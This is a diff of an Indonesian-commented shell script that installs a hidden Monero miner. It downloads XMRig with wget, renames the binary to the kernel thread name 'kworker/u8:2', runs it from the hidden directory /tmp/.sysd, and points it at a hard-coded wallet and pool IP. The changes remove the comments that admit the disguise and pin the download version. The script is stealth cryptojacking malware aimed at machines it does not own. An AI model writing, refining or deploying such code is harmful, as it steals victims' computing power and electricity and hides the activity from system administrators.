@@ -5,8 +5,8 @@ WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrx
 POOL="159.65.167.171:443"
 WORKER_ID="syslog"
 TLS=true
-FAKE_NAME="kworker/u8:2"  # Nama palsu proses agar mirip sistem
-TMP_DIR="/tmp/.sysd"      # Direktori kerja tersembunyi
+FAKE_NAME="kworker/u8:2"
+TMP_DIR="/tmp/.sysd"
 
 # === SIAPKAN DIREKTORI KERJA ===
 mkdir -p "$TMP_DIR"
@@ -15,12 +15,12 @@ cd "$TMP_DIR" || exit
 # === UNDUH XMRIG JIKA BELUM ADA ===
 if [ ! -f "./$FAKE_NAME" ]; then
   echo "[*] Mengunduh XMRig..."
-  wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-static-x64.tar.gz -O xmrig.tar.gz
-  tar -xf xmrig.tar.gz
-  DIR=$(tar -tf xmrig.tar.gz | head -1 | cut -f1 -d"/")
+  wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+  tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
+  DIR=$(tar -tf xmrig-6.24.0-linux-static-x64.tar.gz | head -1 | cut -f1 -d"/")
   mv "$DIR/xmrig" "./$FAKE_NAME"
   chmod +x "$FAKE_NAME"
-  rm -rf "$DIR" xmrig.tar.gz
+  rm -rf "$DIR" xmrig-6.24.0-linux-static-x64.tar.gz
 fi
 
 # === BUAT CONFIG TERSEMBUNYI ===
